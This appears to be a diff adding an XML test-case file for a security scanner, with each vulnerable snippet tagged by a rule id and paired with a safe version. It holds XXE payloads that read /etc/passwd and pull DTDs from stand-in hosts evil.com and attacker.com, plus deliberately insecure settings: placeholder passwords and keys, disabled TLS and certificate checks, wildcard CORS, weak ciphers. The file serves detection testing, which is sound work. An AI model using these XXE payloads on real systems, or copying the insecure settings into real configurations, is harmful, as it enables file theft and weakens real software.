@@ -1,0 +1,444 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- XML Security Vulnerability Test Cases -->
+<!-- This file contains examples of security vulnerabilities in XML configurations -->
+
+<!-- ============================================================================ -->
+<!-- 1. XXE - External Entity Declaration -->
+<!-- ============================================================================ -->
+
+<!-- VULNERABLE: External entity with SYSTEM identifier -->
+<!-- ruleid: xml-xxe-001 -->
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>
+  <data>&xxe;</data>
+</root>
+
+<!-- VULNERABLE: External entity with PUBLIC identifier -->
+<!-- ruleid: xml-xxe-001 -->
+<!DOCTYPE foo [
+  <!ENTITY xxe PUBLIC "-//B//TEXT" "http://evil.com/evil.dtd">
+]>
+<root>
+  <data>&xxe;</data>
+</root>
+
+<!-- SAFE: No external entities -->
+<root>
+  <data>Safe content</data>
+</root>
+
+<!-- ============================================================================ -->
+<!-- 2. XXE - Parameter Entity -->
+<!-- ============================================================================ -->
+
+<!-- VULNERABLE: Parameter entity with SYSTEM -->
+<!-- ruleid: xml-xxe-002 -->
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
+  %xxe;
+]>
+<root>
+  <data>test</data>
+</root>
+
+<!-- VULNERABLE: Parameter entity for data exfiltration -->
+<!-- ruleid: xml-xxe-002 -->
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+  %dtd;
+]>
+<root>
+  <data>test</data>
+</root>
+
+<!-- ============================================================================ -->
+<!-- 3. Hardcoded Credentials -->
+<!-- ============================================================================ -->
+
+<!-- VULNERABLE: Hardcoded password in element -->
+<!-- ruleid: xml-hardcoded-credentials-001 -->
+<configuration>
+  <database>
+    <username>admin</username>
+    <password>SuperSecret123!</password>
+    <host>db.example.com</host>
+  </database>
+</configuration>
+
+<!-- VULNERABLE: Hardcoded password in attribute -->
+<!-- ruleid: xml-hardcoded-credentials-001 -->
+<database username="admin" password="MyP@ssw0rd" host="localhost"/>
+
+<!-- VULNERABLE: Hardcoded passwd element -->
+<!-- ruleid: xml-hardcoded-credentials-001 -->
+<user>
+  <name>admin</name>
+  <passwd>admin123</passwd>
+</user>
+
+<!-- SAFE: Using environment variable -->
+<configuration>
+  <database>
+    <username>admin</username>
+    <password>${DB_PASSWORD}</password>
+    <host>db.example.com</host>
+  </database>
+</configuration>
+
+<!-- SAFE: Masked password -->
+<configuration>
+  <database>
+    <password>********</password>
+  </database>
+</configuration>
+
+<!-- ============================================================================ -->
+<!-- 4. Hardcoded API Keys -->
+<!-- ============================================================================ -->
+
+<!-- VULNERABLE: Hardcoded API key -->
+<!-- ruleid: xml-hardcoded-credentials-002 -->
+<api>
+  <apiKey>AIzaSyDXQwERT123456789abcdefghijklmnop</apiKey>
+  <endpoint>https://api.example.com</endpoint>
+</api>
+
+<!-- VULNERABLE: Hardcoded token -->
+<!-- ruleid: xml-hardcoded-credentials-002 -->
+<authentication>
+  <token>ghp_1234567890abcdefghijklmnopqrstuvwxyz</token>
+</authentication>
+
+<!-- VULNERABLE: Hardcoded secret -->
+<!-- ruleid: xml-hardcoded-credentials-002 -->
+<oauth>
+  <clientId>my-client-id</clientId>
+  <secret>sk_live_1234567890abcdefghijklmnop</secret>
+</oauth>
+
+<!-- SAFE: Using environment variable -->
+<api>
+  <apiKey>${API_KEY}</apiKey>
+  <endpoint>https://api.example.com</endpoint>
+</api>
+
+<!-- ============================================================================ -->
+<!-- 5. Insecure HTTP Protocol -->
+<!-- ============================================================================ -->
+
+<!-- VULNERABLE: HTTP URL in configuration -->
+<!-- ruleid: xml-insecure-protocol-001 -->
+<service>
+  <endpoint>http://api.example.com/data</endpoint>
+</service>
+
+<!-- VULNERABLE: HTTP in resource URL -->
+<!-- ruleid: xml-insecure-protocol-001 -->
+<resources>
+  <image src="http://cdn.example.com/image.jpg"/>
+</resources>
+
+<!-- SAFE: HTTPS URL -->
+<service>
+  <endpoint>https://api.example.com/data</endpoint>
+</service>
+
+<!-- SAFE: Localhost HTTP (allowed) -->
+<service>
+  <endpoint>http://localhost:8080/api</endpoint>
+</service>
+
+<!-- SAFE: XML namespace (not a security issue) -->
+<root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+  <data>test</data>
+</root>
+
+<!-- ============================================================================ -->
+<!-- 6. Debug Mode Enabled -->
+<!-- ============================================================================ -->
+
+<!-- VULNERABLE: Debug enabled in element -->
+<!-- ruleid: xml-debug-enabled-001 -->
+<application>
+  <debug>true</debug>
+  <environment>production</environment>
+</application>
+
+<!-- VULNERABLE: Debug enabled in attribute -->
+<!-- ruleid: xml-debug-enabled-001 -->
+<application debug="true" environment="production"/>
+
+<!-- VULNERABLE: Debug mode enabled -->
+<!-- ruleid: xml-debug-enabled-001 -->
+<settings>
+  <debugMode>true</debugMode>
+</settings>
+
+<!-- SAFE: Debug disabled -->
+<application>
+  <debug>false</debug>
+  <environment>production</environment>
+</application>
+
+<!-- ============================================================================ -->
+<!-- 7. Verbose Error Messages -->
+<!-- ============================================================================ -->
+
+<!-- VULNERABLE: Display errors enabled -->
+<!-- ruleid: xml-verbose-errors-001 -->
+<errorHandling>
+  <displayErrors>true</displayErrors>
+  <logErrors>true</logErrors>
+</errorHandling>
+
+<!-- VULNERABLE: Show exceptions enabled -->
+<!-- ruleid: xml-verbose-errors-001 -->
+<configuration>
+  <showExceptions>true</showExceptions>
+</configuration>
+
+<!-- VULNERABLE: Display errors in attribute -->
+<!-- ruleid: xml-verbose-errors-001 -->
+<errorHandling displayErrors="true"/>
+
+<!-- SAFE: Errors hidden in production -->
+<errorHandling>
+  <displayErrors>false</displayErrors>
+  <logErrors>true</logErrors>
+</errorHandling>
+
+<!-- ============================================================================ -->
+<!-- 8. Wildcard CORS Configuration -->
+<!-- ============================================================================ -->
+
+<!-- VULNERABLE: Wildcard allowed origin -->
+<!-- ruleid: xml-wildcard-cors-001 -->
+<cors>
+  <allowedOrigins>*</allowedOrigins>
+</cors>
+
+<!-- VULNERABLE: Wildcard in attribute -->
+<!-- ruleid: xml-wildcard-cors-001 -->
+<cors allowedOrigin="*"/>
+
+<!-- VULNERABLE: Access-Control-Allow-Origin wildcard -->
+<!-- ruleid: xml-wildcard-cors-001 -->
+<headers>
+  <Access-Control-Allow-Origin>*</Access-Control-Allow-Origin>
+</headers>
+
+<!-- SAFE: Specific origins -->
+<cors>
+  <allowedOrigins>https://example.com</allowedOrigins>
+  <allowedOrigins>https://app.example.com</allowedOrigins>
+</cors>
+
+<!-- ============================================================================ -->
+<!-- 9. SQL Connection String with Password -->
+<!-- ============================================================================ -->
+
+<!-- VULNERABLE: Connection string with password -->
+<!-- ruleid: xml-sql-connection-string-001 -->
+<database>
+  <connectionString>Server=myserver;Database=mydb;User Id=sa;Password=MyP@ssw0rd123;</connectionString>
+</database>
+
+<!-- VULNERABLE: Connection string in attribute -->
+<!-- ruleid: xml-sql-connection-string-001 -->
+<database connectionString="Server=localhost;Database=app;User=admin;Password=secret123;"/>
+
+<!-- SAFE: Integrated authentication -->
+<database>
+  <connectionString>Server=myserver;Database=mydb;Integrated Security=true;</connectionString>
+</database>
+
+<!-- ============================================================================ -->
+<!-- 10. Weak Encryption Algorithm -->
+<!-- ============================================================================ -->
+
+<!-- VULNERABLE: DES algorithm -->
+<!-- ruleid: xml-weak-encryption-001 -->
+<encryption>
+  <algorithm>DES</algorithm>
+  <keySize>56</keySize>
+</encryption>
+
+<!-- VULNERABLE: MD5 hashing -->
+<!-- ruleid: xml-weak-encryption-001 -->
+<hashing algorithm="MD5"/>
+
+<!-- VULNERABLE: RC4 encryption -->
+<!-- ruleid: xml-weak-encryption-001 -->
+<security>
+  <encryption>RC4</encryption>
+</security>
+
+<!-- SAFE: AES-256 encryption -->
+<encryption>
+  <algorithm>AES-256</algorithm>
+  <keySize>256</keySize>
+</encryption>
+
+<!-- SAFE: SHA-256 hashing -->
+<hashing algorithm="SHA-256"/>
+
+<!-- ============================================================================ -->
+<!-- 11. Unrestricted File Upload Path -->
+<!-- ============================================================================ -->
+
+<!-- VULNERABLE: Upload to /tmp directory -->
+<!-- ruleid: xml-file-upload-path-001 -->
+<fileUpload>
+  <uploadPath>/tmp</uploadPath>
+  <maxSize>10485760</maxSize>
+</fileUpload>
+
+<!-- VULNERABLE: Upload to /var/tmp -->
+<!-- ruleid: xml-file-upload-path-001 -->
+<upload>
+  <uploadDir>/var/tmp</uploadDir>
+</upload>
+
+<!-- VULNERABLE: Upload path in attribute -->
+<!-- ruleid: xml-file-upload-path-001 -->
+<fileUpload uploadPath="/tmp" maxSize="10MB"/>
+
+<!-- SAFE: Application-specific upload directory -->
+<fileUpload>
+  <uploadPath>/var/app/uploads</uploadPath>
+  <maxSize>10485760</maxSize>
+</fileUpload>
+
+<!-- ============================================================================ -->
+<!-- 12. Long Session Timeout -->
+<!-- ============================================================================ -->
+
+<!-- VULNERABLE: Session timeout too long (2 hours) -->
+<!-- ruleid: xml-session-timeout-001 -->
+<session>
+  <sessionTimeout>7200</sessionTimeout>
+</session>
+
+<!-- VULNERABLE: Very long timeout (10 hours) -->
+<!-- ruleid: xml-session-timeout-001 -->
+<configuration>
+  <sessionTimeout>36000</sessionTimeout>
+</configuration>
+
+<!-- VULNERABLE: Timeout in attribute -->
+<!-- ruleid: xml-session-timeout-001 -->
+<session sessionTimeout="5400"/>
+
+<!-- SAFE: Reasonable timeout (30 minutes) -->
+<session>
+  <sessionTimeout>1800</sessionTimeout>
+</session>
+
+<!-- ============================================================================ -->
+<!-- 13. SSL/TLS Disabled -->
+<!-- ============================================================================ -->
+
+<!-- VULNERABLE: SSL disabled -->
+<!-- ruleid: xml-ssl-disabled-001 -->
+<connection>
+  <ssl>false</ssl>
+  <host>database.example.com</host>
+</connection>
+
+<!-- VULNERABLE: EnableSSL false -->
+<!-- ruleid: xml-ssl-disabled-001 -->
+<smtp>
+  <enableSSL>false</enableSSL>
+  <host>mail.example.com</host>
+</smtp>
+
+<!-- VULNERABLE: SSL disabled in attribute -->
+<!-- ruleid: xml-ssl-disabled-001 -->
+<connection ssl="false" host="api.example.com"/>
+
+<!-- SAFE: SSL enabled -->
+<connection>
+  <ssl>true</ssl>
+  <host>database.example.com</host>
+</connection>
+
+<!-- ============================================================================ -->
+<!-- 14. Certificate Validation Disabled -->
+<!-- ============================================================================ -->
+
+<!-- VULNERABLE: Certificate validation disabled -->
+<!-- ruleid: xml-certificate-validation-disabled-001 -->
+<https>
+  <validateCertificate>false</validateCertificate>
+  <endpoint>https://api.example.com</endpoint>
+</https>
+
+<!-- VULNERABLE: Verify cert disabled -->
+<!-- ruleid: xml-certificate-validation-disabled-001 -->
+<ssl>
+  <verifyCert>false</verifyCert>
+</ssl>
+
+<!-- VULNERABLE: Validation disabled in attribute -->
+<!-- ruleid: xml-certificate-validation-disabled-001 -->
+<https validateCertificate="false" endpoint="https://api.example.com"/>
+
+<!-- SAFE: Certificate validation enabled -->
+<https>
+  <validateCertificate>true</validateCertificate>
+  <endpoint>https://api.example.com</endpoint>
+</https>
+
+<!-- ============================================================================ -->
+<!-- Complete Configuration Example with Multiple Issues -->
+<!-- ============================================================================ -->
+
+<!-- VULNERABLE: Multiple security issues in one configuration -->
+<application>
+  <!-- ruleid: xml-debug-enabled-001 -->
+  <debug>true</debug>
+
+  <!-- ruleid: xml-verbose-errors-001 -->
+  <displayErrors>true</displayErrors>
+
+  <database>
+    <!-- ruleid: xml-hardcoded-credentials-001 -->
+    <password>admin123</password>
+
+    <!-- ruleid: xml-sql-connection-string-001 -->
+    <connectionString>Server=db;Database=app;User=sa;Password=P@ssw0rd;</connectionString>
+
+    <!-- ruleid: xml-ssl-disabled-001 -->
+    <ssl>false</ssl>
+  </database>
+
+  <api>
+    <!-- ruleid: xml-hardcoded-credentials-002 -->
+    <apiKey>sk_live_1234567890abcdefghijklmnop</apiKey>
+
+    <!-- ruleid: xml-insecure-protocol-001 -->
+    <endpoint>http://api.example.com</endpoint>
+  </api>
+
+  <security>
+    <!-- ruleid: xml-weak-encryption-001 -->
+    <algorithm>MD5</algorithm>
+
+    <!-- ruleid: xml-certificate-validation-disabled-001 -->
+    <validateCertificate>false</validateCertificate>
+  </security>
+
+  <session>
+    <!-- ruleid: xml-session-timeout-001 -->
+    <sessionTimeout>7200</sessionTimeout>
+  </session>
+
+  <cors>
+    <!-- ruleid: xml-wildcard-cors-001 -->
+    <allowedOrigins>*</allowedOrigins>
+  </cors>
+</application>
+
